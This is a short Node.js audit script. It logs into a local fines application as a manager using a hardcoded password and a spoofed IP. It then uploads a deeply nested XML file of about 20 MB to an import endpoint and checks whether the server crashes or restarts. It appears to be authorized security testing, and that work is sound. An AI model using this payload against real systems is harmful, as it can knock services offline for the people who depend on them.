const { Session } = require('./lib.cjs');
const PW = 'P36brgss!23';
async function uptime(){ try{const r=await fetch('http://127.0.0.1:5003/health');const j=await r.json();return j.uptime;}catch(e){return null;} }
function multipart(file){ const b='----AUDITP36B'+Date.now(); return { body: Buffer.concat([
  Buffer.from(`--${b}\r\nContent-Disposition: form-data; name="file"; filename="${file.name}"\r\nContent-Type: text/xml\r\n\r\n`),
  Buffer.from(file.data), Buffer.from(`\r\n--${b}--\r\n`)]), ct:'multipart/form-data; boundary='+b }; }
(async()=>{
  const m=new Session('mgr',{fakeIp:'198.51.100.63'});
  console.log('login',(await m.loginStaff('AUDIT-P36B-manager',PW)).status);
  const depth = 2800000; // ~20 MB of nesting
  const xml='<?xml version="1.0"?>'+'<a>'.repeat(depth)+'x'+'</a>'.repeat(depth);
  console.log('payload bytes', xml.length);
  const u0=await uptime(); console.log('uptime before', u0);
  const mp=multipart({name:'AUDIT-P36B-deep20mb.xml',data:xml});
  try{ const r=await m.request('POST','/api/fines/imports/upload',mp.body,{raw:true,headers:{'Content-Type':mp.ct}});
    console.log('status',r.status,r.text.slice(0,220).replace(/\s+/g,' ')); }
  catch(e){ console.log('CONNECTION DROPPED',String(e)); }
  const u1=await uptime(); console.log('uptime after', u1, (u1!==null&&u0!==null&&u1>u0)?'NO RESTART':'*** RESTARTED/DOWN ***');
  const h=await fetch('http://127.0.0.1:5003/health'); console.log('GET /health ->', h.status);
  const u2=await uptime(); console.log('uptime final', u2);
})();
